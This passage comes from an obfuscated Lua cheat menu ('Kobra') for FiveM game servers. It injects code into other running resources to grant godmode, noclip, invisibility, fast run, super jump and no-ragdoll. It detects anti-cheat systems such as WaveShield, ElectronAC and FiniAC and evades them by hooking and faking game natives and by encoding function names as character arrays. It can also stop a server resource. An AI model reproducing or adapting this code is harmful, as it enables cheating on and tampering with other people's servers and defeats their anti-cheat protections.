                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);elseif v755 then MachoInjectThread(0,"mc9-medicsystem","",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);else MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);end break;end if (v753==(762 -(592 + 170))) then print("1");v754=GetResourceState("WaveShield")=="started" ;v753=1;end end end};for v756,v757 in pairs(v340) do if (GetResourceState(v756)=="started") then v757();end end break;end end end},{type="slider",label="Health",desc="This will set your health to the desired amount.",scrollType="onEnter",value=251 -151 ,min=0,max=47 + 53 ,step=1,onSelect=function(v341) SetEntityHealth(PlayerPedId(),v341 + 100 );end},{type="slider",label="Armour",desc="This will set your armour to the desired amount.",scrollType="onEnter",value=100,min=0 -0 ,max=17 + 83 ,step=1 -0 ,onSelect=function(v342) SetPedArmour(PlayerPedId(),v342);end},{type="button",label="Refill Health",desc="This will refill your health to the maximum value.",onSelect=function() SetEntityHealth(PlayerPedId(),GetEntityMaxHealth(PlayerPedId()));end},{type="button",label="Refill Armour",desc="This will refill your armour to the maximum value.",onSelect=function() SetPedArmour(PlayerPedId(),607 -(353 + 154) );end},{type="checkbox",label="Godmode",checked=false,desc="This will give your player godmode.",onSelect=function(v343) v281:HandleGodmodeToggle(v343);end},{type="checkbox",label="Invisibility",checked=false,desc="This will make your player invisible.",onSelect=function(v344) if v344 then v281:EnableInvisibility();else v281:DisableInvisibility();end end},{type="divider",label="Movement"},{type="slider-checkbox",label="Noclip",scrollType="onScroll",checked=false,value=0.25,step=0.25,min=0.25,max=5,onSelect=function(v345,v346) if v346 then if  not v29 then local v758=0;while true do if (v758==(1 + 0)) then v29=true;break;end if (v758==(0 + 0)) then v12:Notify("info","Kobra","Initializing... Please wait!",1445 -445 );Wait(400);v758=1 -0 ;end end end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                _G.KobraNoclipSpeed = ]]   .. v345   .. [[
                                if not _G.KobraNoclipThreadRunning then
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipThreadRunning = true

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                    hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        -- iterative, non-recursive executor to avoid stack growth
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("Coroutine error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        while _G.KobraNoclipThreadRunning do
                                            Wait(0)
                                            if not _G.KobraNoclipEnabled then
                                                Wait(500)
                                                goto continue
                                            end

                                            local ped = GetPlayerPed(-1)
                                            if not DoesEntityExist(ped) then goto continue end

                                            local vehicle = GetVehiclePedIsIn(ped, false)
                                            local entity = (vehicle ~= 0 and vehicle) or ped
                                            if not DoesEntityExist(entity) then goto continue end

                                            local coords = GetEntityCoords(entity, true)
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                            local pitch = GetGameplayCamRelativePitch()

                                            -- convert once and reuse
                                            local radH = heading * math.pi / 180.0
                                            local radP = pitch * math.pi / 180.0

                                            local dx = -math.sin(radH)
                                            local dy = math.cos(radH)
                                            local dz = math.sin(radP)
                                            local len = math.sqrt(dx*dx + dy*dy + dz*dz)
                                            if len ~= 0 then
                                                dx = dx / len
                                                dy = dy / len
                                                dz = dz / len
                                            end

                                            local speed = _G.KobraNoclipSpeed or 0.25
                                            -- cache control checks to avoid repeating native calls
                                            local sprint = IsControlPressed(0, 21)
                                            local slow = IsControlPressed(0, 19)
                                            if sprint then speed = speed + 1 end
                                            if slow then speed = 0.10 end

                                            local forward = IsControlPressed(0, 32)
                                            local back = IsControlPressed(0, 269)
                                            local left = IsControlPressed(0, 34)
                                            local right = IsControlPressed(0, 9)
                                            local up = IsControlPressed(0, 22)
                                            local down = IsControlPressed(0, 62)

                                            if forward then
                                                coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                            elseif back then
                                                coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                            end

                                            if left then
                                                coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                            elseif right then
                                                coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                            end

                                            if up then
                                                coords = coords + vector3(0.0, 0.0, speed)
                                            elseif down then
                                                coords = coords - vector3(0.0, 0.0, speed)
                                            end

                                            SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                            SetEntityHeading(entity, heading)
                                            ::continue::
                                        end
                                    end)
                                else
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipSpeed = ]]   .. v345   .. [[
                                end
                            ]] );elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(6 -3 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            local function GetRightVector(rot)
                                                local z = math.rad(rot.z)
                                                return vector3(math.cos(z), math.sin(z), 0.0)
                                            end

                                            local function Clamp(val, min, max)
                                                if val < min then return min end
                                                if val > max then return max end
                                                return val
                                            end

                                            local function GetGroundZForCoords(x, y, z)
                                                local found, groundZ = GetGroundZFor_3dCoord(x, y, z, false)
                                                if found then return groundZ end
                                                return z
                                            end

                                            if not _G.inNoClip then
                                                _G.inNoClip = true
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v345   .. [[
                                                _G.noclipCamera = nil
                                                _G.cameraReady = false
                                                _G.originalCoords = nil

                                                local function StartNoclip()
                                                    local playerPed = PlayerPedId()
                                                    _G.originalCoords = GetEntityCoords(playerPed)
                                                    _G.noclipCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                                    SetCamCoord(_G.noclipCamera, _G.originalCoords.x, _G.originalCoords.y, _G.originalCoords.z + 1.0)
                                                    SetCamRot(_G.noclipCamera, 0.0, 0.0, GetEntityHeading(playerPed), 2)
                                                    RenderScriptCams(true, false, 0, true, true)
                                                    SetEntityVisible(playerPed, false, false)
                                                    SetEntityInvincible(playerPed, true)
                                                    SetEntityCollision(playerPed, false, false)
                                                    TaskStandStill(playerPed, -1)
                                                    CreateThread(function()
                                                        Wait(550)
                                                        _G.cameraReady = true
                                                    end)
                                                end

                                                local function Movement()
                                                    if not _G.noclipCamera or not _G.cameraReady then return end
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local camRot = GetCamRot(_G.noclipCamera, 2)
                                                    local speed = _G.KobraNoclipSpeed or ]]   .. v345   .. [[
                                                    if IsControlPressed(0, 21) then speed = speed + 1 end
                                                    if IsControlPressed(0, 19) then speed = 0.10 end
                                                    local forward = RotationToDirection(camRot)
                                                    local right = GetRightVector(camRot)
                                                    local moveX, moveY, moveZ = 0, 0, 0
                                                    if IsControlPressed(0, 32) then
                                                        moveX = moveX + forward.x * speed
                                                        moveY = moveY + forward.y * speed
                                                        moveZ = moveZ + forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 269) then
                                                        moveX = moveX - forward.x * speed
                                                        moveY = moveY - forward.y * speed
                                                        moveZ = moveZ - forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 34) then
                                                        moveX = moveX - right.x * speed
                                                        moveY = moveY - right.y * speed
                                                    end
                                                    if IsControlPressed(0, 9) then
                                                        moveX = moveX + right.x * speed
                                                        moveY = moveY + right.y * speed
                                                    end
                                                    if IsControlPressed(0, 22) then
                                                        moveZ = moveZ + speed
                                                    end
                                                    if IsControlPressed(0, 62) then
                                                        moveZ = moveZ - speed
                                                    end
                                                    SetCamCoord(_G.noclipCamera, camCoords.x + moveX, camCoords.y + moveY, camCoords.z + moveZ)
                                                    local x = GetDisabledControlNormal(0, 1)
                                                    local y = GetDisabledControlNormal(0, 2)
                                                    local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                                                    local newYaw = camRot.z - x * 5
                                                    SetCamRot(_G.noclipCamera, newPitch, camRot.y, newYaw, 2)
                                                    SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
                                                end

                                                CreateThread(function()
                                                    StartNoclip()
                                                    while _G.inNoClip do
                                                        Wait(0)
                                                        if _G.noclipping then
                                                            Movement()
                                                        else
                                                            Wait(500)
                                                        end
                                                    end
                                                end)
                                            else
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v345   .. [[
                                            end
                                        ]] );else MachoInjectResource2(3,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipSpeed = ]]   .. v345   .. [[
                                            if not _G.KobraNoclipThreadRunning then
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipThreadRunning = true
                                                function hNative(nativeName, newFunction)
                                                    local originalNative = _G[nativeName]
                                                    if not originalNative or type(originalNative) ~= "function" then return end
                                                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                                end
                                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsPedFalling", function(originalFn, ...) return true end)
                                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                                hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                                hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                                hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)
                                                CreateThread(function()
                                                    while _G.KobraNoclipThreadRunning do
                                                        Wait(0)
                                                        if not _G.KobraNoclipEnabled then
                                                            Wait(500)
                                                            goto continue
                                                        end
                                                        local ped = PlayerPedId()
                                                        if not DoesEntityExist(ped) then goto continue end
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        local entity = (vehicle ~= 0 and vehicle) or ped
                                                        if not DoesEntityExist(entity) then goto continue end
                                                        local coords = GetEntityCoords(entity, true)
                                                        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                                        local pitch = GetGameplayCamRelativePitch()
                                                        local dx = -math.sin(heading * math.pi / 180.0)
                                                        local dy = math.cos(heading * math.pi / 180.0)
                                                        local dz = math.sin(pitch * math.pi / 180.0)
                                                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                                                        if len ~= 0 then
                                                            dx, dy, dz = dx / len, dy / len, dz / len
                                                        end
                                                        local speed = _G.KobraNoclipSpeed or 0.25
                                                        if IsControlPressed(0, 21) then speed = speed + 1 end
                                                        if IsControlPressed(0, 19) then speed = 0.10 end
                                                        if IsControlPressed(0, 32) then
                                                            coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 269) then
                                                            coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 34) then
                                                            coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 9) then
                                                            coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 22) then
                                                            coords = coords + vector3(0.0, 0.0, speed)
                                                        end
                                                        if IsControlPressed(0, 62) then
                                                            coords = coords - vector3(0.0, 0.0, speed)
                                                        end
                                                        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                                        SetEntityHeading(entity, heading)
                                                        ::continue::
                                                    end
                                                end)
                                            else
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipSpeed = ]]   .. v345   .. [[
                                            end
                                        ]] );end elseif (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                    _G.KobraNoclipEnabled = false
                                    _G.KobraNoclipThreadRunning = false
                                ]]);elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(89 -(7 + 79) ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.inNoClip then
                                                _G.inNoClip = false
                                                _G.noclipping = false
                                                _G.cameraReady = false
                                                local playerPed = PlayerPedId()
                                                if _G.noclipCamera then
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local valid, groundZ = GetGroundZFor_3dCoord(camCoords.x, camCoords.y, camCoords.z, false)
                                                    local targetCoords
                                                    if valid and camCoords.z > -1000.0 and camCoords.z < 10000.0 then
                                                        targetCoords = vector3(camCoords.x, camCoords.y, groundZ + 1.0)
                                                    else
                                                        targetCoords = GetEntityCoords(playerPed)
                                                    end
                                                    SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)
                                                    RenderScriptCams(false, false, 0, true, true)
                                                    DestroyCam(_G.noclipCamera, false)
                                                    _G.noclipCamera = nil
                                                else
                                                    local pedCoords = GetEntityCoords(playerPed)
                                                    SetEntityCoordsNoOffset(playerPed, pedCoords.x, pedCoords.y, pedCoords.z, true, true, true)
                                                end
                                                SetEntityVisible(playerPed, true, true)
                                                SetEntityInvincible(playerPed, false)
                                                SetEntityCollision(playerPed, true, true)
                                                ClearPedTasksImmediately(playerPed)
                                                SetFocusEntity(playerPed)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipEnabled = false
                                            _G.KobraNoclipThreadRunning = false
                                        ]]);end end},{type="slider-checkbox",label="Freecam",scrollType="onScroll",checked=false,value=0.25,step=0.25 + 0 ,min=0.25,max=186 -(24 + 157) ,onSelect=function(v347,v348) v281:ToggleFreecam(v348,v347);end},{type="checkbox",label="Fast Run",checked=false,onSelect=function(v349) if v349 then local v559=0;while true do if (v559==(0 -0)) then v12:Notify("success","Kobra","Fast Run On",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.fastRunEnabled then
                                                _G.fastRunEnabled = true

                                                local GetPlayerPed_fn = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                                local SetRun_fn = g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})
                                                local SetPedMove_fn = g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})
                                                local Wait_fn = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[FastRun] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(1)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.fastRunEnabled do
                                                        local ped = GetPlayerPed_fn(-1)
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(ped, 1.49)
                                                            SetPedMove_fn(ped, 1.49)
                                                        end
                                                        Wait_fn(1)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.FastRunActive == nil then _G.FastRunActive = false end
                                            if _G.FastRunThread == nil then
                                                _G.FastRunThread = true

                                                local CreateThread_fn = CreateThread
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetRun_fn = SetRunSprintMultiplierForPlayer
                                                local SetMove_fn = SetPedMoveRateOverride

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait(0)
                                                        if not _G.FastRunActive then
                                                            Wait(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(PlayerId(), 1.49)
                                                            SetMove_fn(ped, 1.49)
                                                        end
                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            _G.FastRunActive = true
                                        ]]);end break;end end else local v560=0 + 0 ;while true do if (v560==0) then v12:Notify("error","Kobra","Fast Run Off",8081 -5081 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.fastRunEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                return _G[decode(n)]
                                            end
                                            g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                            g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})(g({80,108,97,121,101,114,80,101,100,73,100})(), 1.0)
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.FastRunActive = false
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                            SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                        ]]);end break;end end end end},{type="checkbox",label="Super Jump",checked=false,onSelect=function(v350) local v351=1083 -(1038 + 45) ;local v352;local v353;local v354;local v355;local v356;while true do if (v351==(0 -0)) then v352=GetResourceState("WaveShield")=="started" ;v353=nil;v351=1;end if (v351==(232 -(19 + 211))) then function v354(v759) return _G[v353(v759)];end v355=nil;v351=116 -(88 + 25) ;end if (v351==(9 -5)) then function v356() local v760=0;while true do if (v760==(0 + 0)) then _G.superJumpEnabled=false;v354({1119 -(1007 + 29) ,246 -145 ,26 + 90 ,208 -125 ,285 -168 ,48 + 64 ,10 + 91 ,341 -227 ,49 + 25 ,520 -(342 + 61) ,109,69 + 43 ,220 -136 ,667 -(173 + 390) ,105,429 -(203 + 111) ,5 + 65 ,114,88 + 9 ,815 -(57 + 649) ,33 + 68 })(v354({8 + 72 ,108,458 -361 ,108 + 13 ,1137 -(562 + 474) ,114,73,1005 -(76 + 829) })(),1674 -(1506 + 167) );break;end end end if v350 then if v352 then v355();else MachoInjectResourceRaw("any",[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superJumpEnabled then
                                                _G.superJumpEnabled = true
                                                g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                                    while _G.superJumpEnabled do
                                                        g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                        ]]);end elseif v352 then local v973=0 -0 ;while true do if (v973==0) then print("off");v356();break;end end else MachoInjectResourceRaw("any",[[
                                            _G.superJumpEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                        ]]);end break;end if (v351==(267 -(58 + 208))) then function v353(v761) local v762=0;local v763;while true do if ((1 + 0)==v762) then return v763;end if (v762==(0 + 0)) then v763="";for v1016=1 + 0 , #v761 do v763=v763   .. string.char(v761[v1016]) ;end v762=3 -2 ;end end end v354=nil;v351=2;end if (v351==(340 -(258 + 79))) then function v355() if  not _G.superJumpEnabled then local v907=0 + 0 ;while true do if (v907==(0 -0)) then _G.superJumpEnabled=true;v354({1537 -(1219 + 251) ,1785 -(1231 + 440) ,101,57 + 40 ,116,101,269 -185 ,272 -168 ,248 -134 ,101,851 -(242 + 512) ,208 -108 })(function() while _G.superJumpEnabled do local v1298=0;while true do if (v1298==0) then v354({66 + 17 ,101,8 + 108 ,83,82 + 35 ,222 -110 ,1886 -(1476 + 309) ,114,18 + 56 ,117,109,457 -345 ,84,984 -(672 + 208) ,45 + 60 ,560 -(339 + 106) ,70,1509 -(440 + 955) ,97,37 + 72 ,70 + 31 })(v354({75 + 5 ,246 -138 ,2071 -(1181 + 793) ,428 -(105 + 202) ,81 + 20 ,114,294 -221 ,97 + 3 })());Wait(0 -0 );break;end end end end);break;end end end end v356=nil;v351=4;end end end}}},{label="Miscellaneous",tabs={{icon="",type="button",label="Crash Game",desc="Crashes your game",onSelect=function() MachoInjectResourceRaw("any",[[
                        function SimpleJsonEncode(value)
                            if type(value) == "table" then
                                local parts = {}
                                local isArray = true
                                local maxIndex = 0

                                for k, _ in pairs(value) do
                                    if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                        isArray = false
                                        break
                                    end
                                    maxIndex = math.max(maxIndex, k)
                                end
                                
                                if isArray then
                                    for i = 1, maxIndex do
                                        local v = value[i]
                                        if v == nil then
                                            parts[i] = "null"
                                        else
                                            parts[i] = SimpleJsonEncode(v)
                                        end
                                    end
                                    return "[" .. table.concat(parts, ",") .. "]"
                                else
                                    for k, v in pairs(value) do
                                        if type(k) == "string" then
                                            local encodedValue = SimpleJsonEncode(v)
                                            parts[#parts + 1] = "\"" .. k .. "\":" .. encodedValue
                                        end
                                    end
                                    return "{" .. table.concat(parts, ",") .. "}"
                                end
                            elseif type(value) == "string" then
                                return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                            elseif type(value) == "number" or type(value) == "boolean" then
                                return tostring(value)
                            elseif value == nil then
                                return "null"
                            else
                                return "\"[unserializable:" .. type(value) .. "]\""
                            end
                        end

                        function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(originalNative, ...)
                            end
                        end

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)
                        ]]);end},{icon="",type="button",label="Clear Screen Effects",desc="Removes all screen effects",onSelect=function() print("Revive");end},{icon="",type="button",label="Suicide",desc="This will kill you.",onSelect=function() local v357=0 -0 ;local v358;while true do if (v357==(3 -2)) then v358();break;end if (v357==(339 -(163 + 176))) then v358=nil;function v358() local v764=SetEntityHealth;v764(PlayerPedId(),0);end v357=2 -1 ;end end end},{icon="",type="button",label="Force Ragdoll",desc="This will ragdoll.",onSelect=function() MachoInjectResourceRaw("any",[[
                            local function awfAEDSADWEf()
                                local cWAmdjakwDksFD = SetPedToRagdoll
                                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                            end

                            awfAEDSADWEf()
                            ]]);end},{icon="",type="button",label="Remove Crutch",desc="Remove Crutch is the server is using the correct resource",onSelect=function() MachoResourceStop("wasabi_crutch");end},{icon="",type="scrollable",value=346 -(124 + 221) ,values={"Primary","Secondary"},label="Clear Tasks",desc="Clears the character's tasks",onSelect=function(v359) if (v359=="Primary") then ClearPedTasksImmediately(PlayerPedId());elseif (v359=="Secondary") then ClearPedSecondaryTask(PlayerPedId());end end},{type="divider",label="Toggles"},{type="checkbox",label="No Ragdoll",checked=false,desc="This will prevent you from being ragdolled from admins or cheaters.",onSelect=function(v360) local v361=GetResourceState("WaveShield")=="started" ;local v362=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v360 then if v361 then local v765=0;while true do if ((0 + 0)==v765) then v12:Notify("success","Kobra","No Ragdoll Enabled",3046 -(45 + 1) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local setCanRagdoll = SetPedCanRagdoll
                                                local setRagdollOnCollision = SetPedRagdollOnCollision
                                                local setRagdollFromImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRagdoll = IsPedRagdoll
                                                local clearTasks = ClearPedTasksImmediately

                                                while noRagdollEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 then
                                                        setCanRagdoll(ped, false)
                                                        setRagdollOnCollision(ped, false)
                                                        setRagdollFromImpact(ped, false)
                                                        if isRagdoll(ped) then
                                                            clearTasks(ped)
                                                        end
                                                    end
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    setCanRagdoll(ped, true)
                                                    setRagdollOnCollision(ped, true)
                                                    setRagdollFromImpact(ped, true)
                                                end
                                            end)
                                        ]]);break;end end else local v766=0 + 0 ;while true do if (v766==(1990 -(1282 + 708))) then v48(v362,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function startNoRagdoll()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local setCan = SetPedCanRagdoll
                                                local setColl = SetPedRagdollOnCollision
                                                local setImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRag = IsPedRagdoll
                                                local clear = ClearPedTasksImmediately

                                                create(function()
                                                    while noRagdollEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 then
                                                            setCan(ped, false)
                                                            setColl(ped, false)
                                                            setImpact(ped, false)
                                                            if isRag(ped) then
                                                                clear(ped)
                                                            end
                                                        end
